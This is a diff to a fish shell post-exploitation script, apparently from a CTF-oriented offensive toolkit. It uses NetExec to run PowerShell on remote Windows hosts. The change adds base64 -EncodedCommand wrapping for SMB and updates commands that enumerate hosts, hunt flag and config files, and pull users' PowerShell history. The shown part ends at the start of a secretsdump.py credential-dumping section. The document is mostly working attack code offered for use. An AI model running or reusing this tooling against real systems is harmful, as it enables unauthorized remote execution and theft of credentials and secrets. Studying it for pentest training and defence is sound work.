@@ -1,3 +1,15 @@
+function __ezpz_getloot_ps --argument-names protocol script
+    # SMB goes through cmd, which breaks pipelines and expands PowerShell
+    # variables such as $_ before the inner shell sees them. Ship the script
+    # as -EncodedCommand instead.
+    if test "$protocol" = smb
+        set -l encoded (printf '%s' "$script" | iconv -f utf-8 -t utf-16le | base64 -w0)
+        echo "cmd /c powershell -NoProfile -EncodedCommand $encoded"
+    else
+        echo "$script"
+    end
+end
+
 function __ezpz_getloot_filter
     # Strip nxc's "PROTO host port HOST" prefix and PowerShell transport noise
     # (CLIXML progress/error records) so only command output remains.
@@ -178,30 +190,23 @@ Examples:
     # Build authentication arguments for nxc
     set -l nxc_args $nxc_target $auth_args
 
-    # Determine PowerShell wrapper for SMB
-    set pwsh_wrapper ""
-    if test "$protocol" = "smb"
-        set pwsh_wrapper "cmd /c powershell -c "
-    end
-
-
     # Section 1: Dumping Machine Information
     ezpz_header "Dumping machine information..."
 
     ezpz_info "Hostname"
     set cmd "hostname"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter
 
     ezpz_info "Operating System"
     set cmd "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter
 
     ezpz_info "Users with home directories"
     set cmd "Get-ChildItem C:/Users -Force | Select-Object Name"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter | grep -iv 'Desktop.ini'
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter | grep -iv 'Desktop.ini'
 
     # Section 2: Getting Network Information
     ezpz_header "Getting network information..."
@@ -209,31 +214,31 @@ Examples:
     ezpz_info "Network interfaces"
     set cmd "Get-NetIPConfiguration"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'
 
     ezpz_info "ARP Cache"
     set cmd "arp -a"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'
 
     # Section 3: Extracting Secrets
     ezpz_header "Extracting secrets..."
 
     ezpz_info "Searching for flag files (flag.txt, user.txt, root.txt)"
-    set cmd 'Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | ForEach-Object { Write-Output "[FOUND] $_"; Get-Content -LiteralPath $_ -ErrorAction SilentlyContinue }'
+    set cmd 'Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notlike "C:\Documents and Settings\*" } | Select-Object -ExpandProperty FullName | ForEach-Object { Write-Output (\'[FOUND] \' + $_); Get-Content -LiteralPath $_ -ErrorAction SilentlyContinue }'
 
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter
 
     ezpz_info "Searching for interesting files in user folders"
     set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat,*.exe,*.lnk -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | grep -vi 'start menu' | grep -v 'SendTo' | grep -v 'Searches' | grep -viE '[\\/](flag|user|root)\.txt$' | sort -u
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | grep -vi 'start menu' | grep -v 'SendTo' | grep -v 'Searches' | grep -viE '[\\/](flag|user|root)\.txt$' | sort -u
 
     ezpz_info "Extracting shell history (PowerShell and CMD)"
     set cmd "Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
     ezpz_cmd $cmd
-    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | __ezpz_getloot_filter
+    ezpz_spin nxc $protocol $nxc_args -X (__ezpz_getloot_ps $protocol "$cmd") | __ezpz_getloot_filter
 
     # Section 4: SecretsDump.py Integration
     ezpz_header "Dumping credentials with secretsdump.py..."
